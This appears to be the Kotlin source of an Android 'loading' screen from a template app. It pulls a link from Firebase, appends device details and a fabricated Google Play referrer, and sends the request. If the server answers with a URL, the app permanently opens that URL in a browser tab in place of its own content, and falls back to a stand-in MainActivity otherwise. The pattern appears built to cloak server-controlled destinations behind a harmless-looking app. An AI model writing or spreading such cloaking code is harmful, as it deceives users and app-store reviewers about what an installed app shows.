package com.template

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.WebView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.result.contract.ActivityResultContracts.RequestPermission
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.ktx.messaging
import com.template.databinding.ActivityLoadingBinding
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okio.IOException
import java.util.Calendar
import java.util.UUID


class LoadingActivity : AppCompatActivity() {
    lateinit var mFirebaseAnalytics: FirebaseAnalytics
    private lateinit var binding: ActivityLoadingBinding
    private lateinit var preferences: SharedPreferences
    val TAG = "LoadingActivity"

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { isGranted: Boolean ->
        if (isGranted) {
            log("granted")
        } else {
            log("not granted")
        }
    }

    private fun askNotificationPermission() {
        // This is only necessary for API level >= 33 (TIRAMISU)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) ==
                PackageManager.PERMISSION_GRANTED
            ) {
                log("FCM SDK (and your app) can post notifications.")
            } else if (shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS)) {
                log("shouldShowRequestPermissionRationale")
                // TODO: display an educational UI explaining to the user the features that will be enabled
                //       by them granting the POST_NOTIFICATION permission. This UI should provide the user
                //       "OK" and "No thanks" buttons. If the user selects "OK," directly request the permission.
                //       If the user selects "No thanks," allow the user to continue without notifications.
            } else {
                log("Directly ask for the permission")
                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        Firebase.messaging.token.addOnCompleteListener(
            OnCompleteListener { task ->
                if (!task.isSuccessful) {
                    log("Fetching FCM registration token failed $task.exception")
                    return@OnCompleteListener
                }

                // Get new FCM registration token
                val token = task.result

                // Log and toast
                val msg = getString(R.string.msg_token_fmt, token)
                log(msg)
                Toast.makeText(baseContext, msg, Toast.LENGTH_SHORT).show()
            },
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Create channel to show notifications.
//            val channelId = getString(R.string.default_notification_channel_id)
//            val channelName = getString(R.string.default_notification_channel_name)
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(
                NotificationChannel(
                    "channelId",
                    "channelName",
                    NotificationManager.IMPORTANCE_LOW,
                ),
            )
        }

        askNotificationPermission()

        preferences = getSharedPreferences("my", MODE_PRIVATE)
        val url = preferences.getString("url", "") ?: "bad"

        if(url == "bad") {
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        val alreadyRunWithInternet = preferences.getBoolean("alreadyRunWithInternet", false)
        val saved = url.isNotEmpty()

        if (!isInternetAvailable(this)) {
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        if (alreadyRunWithInternet) {
            if (saved) {
                openChromeCustomTab(url)
                return
            } else {
                startActivity(Intent(this, MainActivity::class.java))
                return
            }
        }

        val editor = preferences.edit()
        editor.putBoolean("alreadyRunWithInternet", true)
        editor.apply()

        FirebaseApp.initializeApp(this)
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this)
//        FirebaseMessaging.getInstance().subscribeToTopic("all")
        val database = FirebaseDatabase.getInstance()
        val ref = database.getReference("db")
        ref.addValueEventListener(object : ValueEventListener {
            /**
             * This method will be called with a snapshot of the data at this location. It will also be called
             * each time that data changes.
             *
             * @param snapshot The current data at the location
             */
            override fun onDataChange(snapshot: DataSnapshot) {
                try {
                    val domenFromFireBase = snapshot.child("link")
                    val url = makeLink(domenFromFireBase.value.toString())

                    getSite(url)
                    log("domenFromFireBase = $url")
                } catch (e: Exception){
                    log("onDataChange error=${e.message}")
                    Toast.makeText(baseContext, "error=${e.message}", Toast.LENGTH_SHORT).show()
                }
            }

            /**
             * This method will be triggered in the event that this listener either failed at the server, or
             * is removed as a result of the security and Firebase Database rules. For more information on
             * securing your data, see: [ Security
 * Quickstart](https://firebase.google.com/docs/database/security/quickstart)
             *
             * @param error A description of the error that occurred
             */
            override fun onCancelled(error: DatabaseError) {
                log( "error=$error")
            }

        })
    }

    private fun openChromeCustomTab(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.green))
        builder.addDefaultShareMenuItem()
        val customTabsIntent = builder.build()
        log("openChromeCustomTab with url=$url")
        customTabsIntent.launchUrl(this, Uri.parse(url))
    }

    private fun makeLink(domenFromFireBase: String): String {
        val res = "$domenFromFireBase/?" +
                "packageid=" + applicationContext.packageName +
                "&usserid=" + UUID.randomUUID() +
                "&getz=" + Calendar.getInstance().timeZone.id +
                "&getr=utm_source=google-play&utm_medium=organic"
        log("makeLink=$res")
        return res
    }

    private fun getSite(aUrl: String) {
        val client = OkHttpClient()

        val webView = WebView(applicationContext)
        val userAgent = webView.settings.userAgentString
        log("userAgent=$userAgent")

        // Создаем Request с использованием заданного URL-адреса и User Agent
        val request = Request.Builder()
            .url(aUrl)
            .header("User-Agent", userAgent)
            .build()

        // Выполняем запрос
        client.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                // Обработка ответа
                val responseBody = response.body?.string()
                log("responseBody=$responseBody")
                response.code
                log("responsecode=${response.code}")
                val editor = this@LoadingActivity.preferences.edit()
                if (responseBody != null) {
                    editor.putString("url", responseBody)
                    openChromeCustomTab(responseBody)
                    finish()
                } else {
                    editor.putString("url", "bad");
                    startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
//                    this@LoadingActivity.finish() ???
                }

                editor.apply()
            }

            override fun onFailure(call: Call, e: IOException) {
                // Обработка ошибки
                log( "Error Callback: ${e.message}")
                val editor = this@LoadingActivity.preferences.edit()
                editor.putString("url", "bad");
                editor.apply()
                startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
            }
        })
    }
}

fun main() {
    val timeZone = Calendar.getInstance().timeZone
    println(timeZone.displayName)
    println(timeZone.id)
}